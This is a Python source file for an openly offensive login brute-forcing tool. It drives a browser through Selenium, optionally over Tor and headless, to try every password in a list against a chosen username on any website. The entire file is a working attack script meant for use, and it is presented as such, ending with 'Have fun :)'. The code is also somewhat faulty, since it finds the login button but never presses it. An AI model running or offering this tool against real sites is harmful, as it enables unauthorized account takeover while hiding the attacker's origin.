# Coded by METACHAR
# Looking to work with other hit me up on my email @metachar1@gmail.com <--
import sys
import datetime
import selenium
import requests
import time as t
from sys import stdout
from selenium import webdriver
from optparse import OptionParser
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

from cosmetic import banner, color

from tbselenium.tbdriver import TorBrowserDriver
from tbselenium.utils import start_xvfb, stop_xvfb
from tbselenium.utils import launch_tbb_tor_with_stem
from tbselenium.common import STEM_SOCKS_PORT, USE_RUNNING_TOR,\
    STEM_CONTROL_PORT

#Config#
parser = OptionParser()
now = datetime.datetime.now()
tbb_path = '/home/mok/.tor-browser-en/INSTALL'


#Args
parser.add_option("-u", "--username", dest="username",help="Choose the username")
parser.add_option("--usernamesel", dest="usernamesel",help="Choose the username selector")
parser.add_option("--passsel", dest="passsel",help="Choose the password selector")
parser.add_option("--loginsel", dest="loginsel",help= "Choose the login button selector")
parser.add_option("--passlist", dest="passlist",help="Enter the password list directory")
parser.add_option("--website", dest="website",help="choose a website")
parser.add_option("--tor", dest="tor", action="store_true", help="To conduct the attack through Tor")
parser.add_option("--headless", dest="headless", action="store_true", help="Attack using a headless browser")
(options, args) = parser.parse_args()




def wizard(use_tor=False, headless=False):
    print (banner)
    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
    print(color.GREEN + '[!] '+color.CWHITE + 'Checking if site exists ', flush=True),
    t.sleep(1)
    try:
        request = requests.get(website)
        if request.status_code == 200:
            print(color.GREEN + '[OK]'+color.CWHITE, flush=True)
    except selenium.common.exceptions.NoSuchElementException:
        pass
    except KeyboardInterrupt:
        print(color.RED + '[!]'+color.CWHITE+ 'User used Ctrl-c to exit')
        exit()
    except:
        t.sleep(1)
        print(color.RED + '[X]'+color.CWHITE)
        t.sleep(1)
        print(color.RED + '[!]'+color.CWHITE+ ' Website could not be located make sure to use http / https')
        exit()

    username_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
    password_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
    login_btn_selector = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
    username = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
    passlist = input(color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
    if use_tor:
        if headless:
            brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True, headless=True)
        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True) 
    else:
        if headless:
            brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, headless=True)
        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website)

def brutes(username, username_selector, password_selector, login_btn_selector, passlist, website, use_tor=False, headless=False):
    f = open(passlist, 'r')
    if use_tor:
        if headless:
            xvfb_display = start_xvfb()
            browser = TorBrowserDriver(tbb_path)
        else:
            browser = TorBrowserDriver(tbb_path)
    else:
        optionss = webdriver.ChromeOptions()
        optionss.add_argument("--disable-popup-blocking")
        optionss.add_argument("--disable-extensions")
        if headless:
            optionss.add_argument("headless")
        browser = webdriver.Chrome(chrome_options=optionss)
    while True:
        try:
            for line in f:
                browser.get(website)
                t.sleep(2)
                Sel_user = browser.find_element_by_css_selector(username_selector) #Finds Selector
                Sel_pas = browser.find_element_by_css_selector(password_selector) #Finds Selector
                enter = browser.find_element_by_css_selector(login_btn_selector) #Finds Selector
                Sel_user.send_keys(username)
                Sel_pas.send_keys(line)
                print('------------------------')
                print(color.GREEN + 'Tried password: '+color.RED + line + color.GREEN + 'for user: '+color.RED+ username)
                print('------------------------')
                # What happens when we're all out of passwords???
        except KeyboardInterrupt: #returns to main menu if ctrl C is used
            if use_tor and headless:
              stop_xvfb(xvfb_display)
            exit()
        except selenium.common.exceptions.NoSuchElementException:
            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
            print('LAST PASS ATTEMPT BELLOW')
            print(color.GREEN + 'Password has been found: {0}'.format(line))
            print(color.YELLOW + 'Have fun :)')
            if use_tor and headless:
              stop_xvfb(xvfb_display)
            exit()

username = options.username
username_selector = options.usernamesel
password_selector = options.passsel
login_btn_selector = options.loginsel
website = options.website
passlist = options.passlist

if not (username and \
        username_selector and \
        password_selector and \
        login_btn_selector and \
        website and \
        passlist):
    if options.tor:
        if options.headless:
            wizard(use_tor=True, headless=True)
        wizard(use_tor=True)
    else:
        if options.headless:
            wizard(headless=True)
        wizard()


print(banner)
if options.tor:
    if options.headless:
        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True, headless=True)
    brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, use_tor=True) 
else:
    if options.headless:
        brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website, headless=True)
    brutes(username, username_selector ,password_selector,login_btn_selector,passlist, website)


